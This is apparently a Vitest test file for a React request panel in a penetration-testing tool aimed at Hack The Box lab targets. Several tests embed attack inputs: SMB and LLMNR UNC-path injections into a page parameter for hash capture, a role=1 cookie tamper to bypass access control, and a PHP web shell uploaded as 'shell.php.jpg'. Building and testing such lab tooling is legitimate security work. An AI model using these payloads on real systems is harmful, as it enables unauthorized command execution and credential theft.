// @vitest-environment jsdom
import { cleanup, fireEvent, render, screen } from "@testing-library/react";
import { afterEach, expect, it, vi } from "vitest";
import { GraphRequestPanel } from "./GraphRequestPanel";

afterEach(() => {
  cleanup();
  localStorage.clear();
  vi.unstubAllGlobals();
});

it("inserts an SMB direct injection path without leaving the graph request panel", async () => {
  vi.stubGlobal("fetch", vi.fn(() => Promise.resolve(new Response(JSON.stringify({
    tun0: "tun0 UNKNOWN 10.10.16.178/23",
  }), { headers: { "Content-Type": "application/json" } }))));
  location.hash = "#graph";
  render(<GraphRequestPanel draft={{ projectId: 3, targetId: 10, serviceId: 20,
    url: "http://unika.htb/index.php?page=french.html" }} onBack={vi.fn()} />);

  fireEvent.click(await screen.findByText("SMB Direct Injection 시도"));
  expect((screen.getByLabelText("Request URL") as HTMLInputElement).value)
    .toBe("http://unika.htb/index.php?page=\\\\10.10.16.178\\test");
  expect(location.hash).toBe("#graph");
});

it("inserts a nonexistent host path for an LLMNR attempt", async () => {
  vi.stubGlobal("fetch", vi.fn(() => Promise.resolve(new Response(JSON.stringify({
    tun0: "tun0 UNKNOWN 10.10.16.178/23",
  }), { headers: { "Content-Type": "application/json" } }))));
  render(<GraphRequestPanel draft={{ projectId: 3, targetId: 10, serviceId: 20,
    url: "http://unika.htb/index.php?page=french.html" }} onBack={vi.fn()} />);

  fireEvent.click(screen.getByText("LLMNR 시도"));
  expect((screen.getByLabelText("Request URL") as HTMLInputElement).value)
    .toBe("http://unika.htb/index.php?page=\\\\UNKNOWN-SERVER\\share");
});

it("sends a custom cookie without leaving the graph -- e.g. an access-control-bypass role=1", async () => {
  // The backend already accepted a cookies dict end to end (WebWorkspace's
  // own full page already had this field) -- this panel just never exposed
  // it, so a role=0 -> role=1 cookie tamper meant abandoning the graph for
  // the standalone Web Testing page.
  let savedPayload: Record<string, unknown> | undefined;
  vi.stubGlobal("fetch", vi.fn((input: RequestInfo | URL, init?: RequestInit) => {
    const url = String(input);
    if (url.endsWith("/api/vpn/status")) return Promise.resolve(new Response(
      JSON.stringify({ tun0: "" }), { headers: { "Content-Type": "application/json" } }));
    if (url.endsWith("/api/web/requests") && init?.method === "POST") {
      savedPayload = JSON.parse(String(init.body));
      return Promise.resolve(new Response(JSON.stringify({ id: 9 }),
        { status: 201, headers: { "Content-Type": "application/json" } }));
    }
    throw new Error(`Unhandled request: ${url}`);
  }));
  render(<GraphRequestPanel draft={{ projectId: 3, targetId: 10, serviceId: 20,
    url: "http://oopsie.htb/cdn-cgi/login/admin.php" }} onBack={vi.fn()} />);

  fireEvent.change(screen.getByLabelText("Cookies"), { target: { value: '{"role":"1"}' } });
  fireEvent.click(screen.getByText("요청 저장"));

  await vi.waitFor(() => expect(savedPayload?.cookies).toEqual({ role: "1" }));
});

it("uploads a file through the request panel -- multipart body mode never existed before", async () => {
  let sentPayload: Record<string, unknown> | undefined;
  vi.stubGlobal("fetch", vi.fn((input: RequestInfo | URL, init?: RequestInit) => {
    const url = String(input);
    if (url.endsWith("/api/vpn/status")) return Promise.resolve(new Response(
      JSON.stringify({ tun0: "" }), { headers: { "Content-Type": "application/json" } }));
    if (url.endsWith("/api/web/requests") && init?.method === "POST") {
      sentPayload = JSON.parse(String(init.body));
      return Promise.resolve(new Response(JSON.stringify({ id: 11 }),
        { status: 201, headers: { "Content-Type": "application/json" } }));
    }
    throw new Error(`Unhandled request: ${url}`);
  }));
  render(<GraphRequestPanel draft={{ projectId: 3, targetId: 10, serviceId: 20,
    url: "http://oopsie.htb/cdn-cgi/upload.php" }} onBack={vi.fn()} />);

  fireEvent.change(screen.getByLabelText("Body mode"), { target: { value: "multipart" } });
  fireEvent.change(screen.getByLabelText("업로드 필드명"), { target: { value: "avatar" } });
  const file = new File(["<?php system($_GET['c']); ?>"], "shell.php.jpg", { type: "image/jpeg" });
  fireEvent.change(screen.getByLabelText("업로드 파일 선택"), { target: { files: [file] } });
  await screen.findByText(/shell\.php\.jpg/);
  fireEvent.change(screen.getByLabelText("추가 폼 필드 · JSON"),
    { target: { value: '{"submit":"Upload"}' } });

  fireEvent.click(screen.getByText("요청 저장"));

  await vi.waitFor(() => expect(sentPayload?.body_mode).toBe("multipart"));
  const parsedBody = JSON.parse(sentPayload!.body as string);
  expect(parsedBody.fields).toEqual({ submit: "Upload" });
  expect(parsedBody.files).toEqual([{ field: "avatar", filename: "shell.php.jpg",
    content_type: "image/jpeg", content_b64: expect.any(String) }]);
});
